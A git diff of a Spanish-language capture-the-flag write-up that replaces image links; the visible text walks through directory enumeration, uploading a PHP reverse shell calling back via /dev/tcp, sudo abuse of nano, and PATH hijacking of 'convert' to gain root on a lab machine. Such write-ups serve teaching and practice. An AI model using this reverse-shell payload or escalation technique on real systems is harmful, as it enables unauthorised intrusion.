@@ -18,7 +18,7 @@ La página veremos que es una galería de fotos, no hay pistas ni credenciales s
 ```
 gobuster dir -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://172.17.0.2/ -x php,html
 ```
-<img width="672" height="523" alt="image" src="https://github.com/user-attachments/assets/02217a10-19cb-4ec0-ac73-8ced14da7844" />
+![](images/im2.png)
 
 Veremos que está disponible el subdirectorio `/gallery/` el cuál es un **Directory Listing** y que explorando un poco, llegaremos a `handler.php`, el cual al entrar veremos que nos permite subir un archivo.
 
@@ -28,7 +28,7 @@ crearemos un pequeño script en `php` el cual al ejecutarse se refleje una rever
 echo '<?php system("bash -c '"'"'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'"'"'"); ?>' > script.php
 ```
 Una vez subido, se vera reflejado en `http://172.17.0.2/gallery/uploads/images/`
-<img width="611" height="423" alt="image" src="https://github.com/user-attachments/assets/2845f527-dbf6-418a-b339-94f0cf19756b" />
+![](images/img3.png)
 
 Si entramos al archivo escuchando en el puerto 443 con `nc -lvnp 443` habremos accedido al sistema.
 
@@ -42,7 +42,7 @@ export TERM=xterm
 export SHELL=bash
 ```
 Una vez tratada, ejecutaremos `sudo -l` y encontraremos `(gallery) NOPASSWD: /bin/nano`
-<img width="572" height="174" alt="image" src="https://github.com/user-attachments/assets/eacedecf-628b-47ad-acdd-eb1d99b11da1" />
+![](images/img4.png)
 
 Por lo que de acuerdo con [GTFObins](https://gtfobins.org/gtfobins/nano/#shell) ejecutaremos los siguiente comandos:
 ```
@@ -54,7 +54,7 @@ Y habremos obtenido acceso al usuario `gallery`, opcional volver a ejecutar `scr
 
 ## Paso N5: Escalando privilegios
 Si ejecutamos `sudo -l` estando en el usuario `gallery` veremos `(ALL) NOPASSWD: /usr/local/bin/runme`
-<img width="561" height="124" alt="image" src="https://github.com/user-attachments/assets/a03a2946-9b39-4c57-925d-d7f1418968ef" />
+![](images/img5.png)
 
 Ejecutamos
 ```
@@ -64,7 +64,7 @@ Y veremos que se esta ejecutando
 ```
 convert /var/www/html/gallery/uploads/images/input.png /var/www/html/gallery/uploads
 ```
-<img width="672" height="423" alt="image" src="https://github.com/user-attachments/assets/f6a531f9-e1bf-4309-99db-90cb2f318322" />
+![](images/img6.png)
 
 Esta llamando el binario `convert` sin ruta absoluta, por lo que podremos realizar un **PATH hijacking** ejecutando los siguientes comandos:
 ```
@@ -77,7 +77,7 @@ export PATH=.:$PATH
 **Explicación:** Básicamente, como el binario `convert` no especifica ruta absoluta en su ejecución, podemos ejecutar comandos haciendose pasar por el binario `convert`. `PATH` es la lista de carpetas donde el sistema busca ejecutables (en este caso nuestro `/usr/local/bin/runme`) y al poner `.$PATH` basicamente está buscando el ejecutable en carpeta actual, en este caso `convert`.
 
 Ya una vez sobreescrito el binario `convert` ejecutamos `sudo /usr/local/bin/runme`
-<img width="436" height="87" alt="image" src="https://github.com/user-attachments/assets/53336003-ec03-4a71-b1db-6c7a6726cc47" />
+![](images/img7.png)
 
 Y finalmente, seremos usuarios root.
 
